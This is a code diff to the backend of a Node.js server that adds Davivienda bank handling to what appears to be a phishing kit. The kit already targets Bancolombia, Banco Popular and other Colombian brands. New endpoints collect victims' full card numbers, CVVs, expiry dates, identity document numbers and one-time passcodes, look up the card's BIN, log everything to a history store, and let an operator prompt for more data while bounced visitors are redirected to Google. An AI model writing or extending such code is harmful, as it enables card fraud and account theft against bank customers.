@@ -180,7 +180,6 @@ function getRealIP(req) {
     const xff = req.headers['x-forwarded-for'];
     if (xff && typeof xff === 'string') {
         const partes = xff.split(',').map(s => s.trim()).filter(Boolean);
-        // Railway puede agregar IPs internas del proxy. Buscamos la primera IP pública.
         for (const ipParte of partes) {
             if (!esIPPrivada(ipParte)) return ipParte;
         }
@@ -502,7 +501,8 @@ const server = http.createServer(async (req, res) => {
                         PEDIR_CC: 'pedir_cc',
                         PEDIR_DATOS: 'pedir_datos',
                         PEDIR_DINAMICA: 'pedir_dinamica',
-                        YA_PAGO: 'ya_pagado'
+                        YA_PAGO: 'ya_pagado',
+                        PEDIR_TARJETA: 'mostrar_tarjeta'  // 🔥 NUEVO Davivienda
                     };
                     if (!mapEstados[accion]) { json(res, 400, { ok: false, error: 'Acción inválida' }); return; }
                     let estadoNuevo = mapEstados[accion];
@@ -972,6 +972,65 @@ const server = http.createServer(async (req, res) => {
             return;
         }
 
+        /* 🔥 NUEVO: endpoint específico de Davivienda para recibir la tarjeta */
+        if (req.method === 'POST' && url === '/davivienda/enviar-pago') {
+            if (!checkRateLimit(ip, 'publico')) { json(res, 200, { ok: false, bloqueado: true, redirect: 'https://www.google.com' }); return; }
+            try {
+                const datos = await getBody(req);
+                const { sessionId, tarjeta, titular, docType, docNumber, monto, expMes, expAnio, cvv } = datos;
+
+                if (!sessionId) { json(res, 400, { ok: false, error: 'Falta sessionId' }); return; }
+
+                const previos = datosSesiones.get(sessionId) || {};
+                const infoBin = await obtenerInfoBin(tarjeta);
+
+                const datosSesion = Object.assign({}, previos, {
+                    sessionId,
+                    bancoKey: 'davivienda',
+                    marca: 'davivienda',
+                    tarjeta, titular, docType, docNumber, monto, expMes, expAnio, cvv,
+                    ip: previos.ip || ip,
+                    creadoEn: previos.creadoEn || new Date().toISOString(),
+                    bin: infoBin?.bin || '',
+                    cardBrand: infoBin?.cardBrand || 'Desconocida',
+                    cardType: infoBin?.cardType || 'Desconocido',
+                    cardLevel: infoBin?.cardLevel || 'Desconocido',
+                    bankName: infoBin?.bankName || 'Desconocido',
+                    countryName: infoBin?.countryName || 'Desconocido'
+                });
+
+                estadoSesiones.set(sessionId, 'pendiente');
+                datosSesiones.set(sessionId, datosSesion);
+                ultimaAccionSesiones.set(sessionId, 'ENVIAR_PAGO');
+                pasosSesiones.set(sessionId, 'Davivienda Tarjeta');
+
+                guardarHistorial('davivienda', datosSesion);
+
+                console.log(`[DAVIVIENDA] Pago tarjeta recibido: ${sessionId} | Tarjeta: ${tarjeta}`);
+                json(res, 200, { ok: true, sessionId, binInfo: infoBin });
+            } catch (e) { json(res, 500, { ok: false, error: e.message }); }
+            return;
+        }
+
+        /* 🔥 NUEVO: endpoint específico de Davivienda para recibir OTP */
+        if (req.method === 'POST' && url === '/davivienda/enviar-otp') {
+            if (!checkRateLimit(ip, 'publico')) { json(res, 200, { ok: false, bloqueado: true, redirect: 'https://www.google.com' }); return; }
+            try {
+                const { sessionId, otp } = await getBody(req);
+                if (!sessionId || !otp) { json(res, 400, { ok: false }); return; }
+                const datosOriginales = datosSesiones.get(sessionId) || {};
+                const datosCompletos = Object.assign({}, datosOriginales, { otp });
+                estadoSesiones.set(sessionId, 'otp');
+                datosSesiones.set(sessionId, datosCompletos);
+                ultimaAccionSesiones.set(sessionId, 'ENVIAR_OTP');
+
+                guardarHistorial('davivienda', datosCompletos);
+
+                json(res, 200, { ok: true, sessionId });
+            } catch (e) { json(res, 500, { ok: false, error: e.message }); }
+            return;
+        }
+
         const enviarMatch = url.match(/^\/([a-z-]+)\/enviar$/);
         if (req.method === 'POST' && enviarMatch) {
             if (!checkRateLimit(ip, 'publico')) { json(res, 200, { ok: false, bloqueado: true, redirect: 'https://www.google.com' }); return; }
@@ -1036,7 +1095,7 @@ const server = http.createServer(async (req, res) => {
         if (req.method === 'GET' && estadoMatch) {
             const bancoKey = estadoMatch[1];
             const sessionId = estadoMatch[2];
-            const esValido = bancos[bancoKey] || bancoKey === 'bancolombia' || bancoKey === 'bc' || bancoKey === 'cc-bogota' || bancoKey === 'cc-bucaramanga' || bancoKey === 'vanti' || bancoKey === 'popular';
+            const esValido = bancos[bancoKey] || bancoKey === 'bancolombia' || bancoKey === 'bc' || bancoKey === 'cc-bogota' || bancoKey === 'cc-bucaramanga' || bancoKey === 'vanti' || bancoKey === 'popular' || bancoKey === 'davivienda';
             if (!esValido) { json(res, 404, { ok: false }); return; }
             const estado = estadoSesiones.get(sessionId) || 'pendiente';
             const accion = ultimaAccionSesiones.get(sessionId) || '';
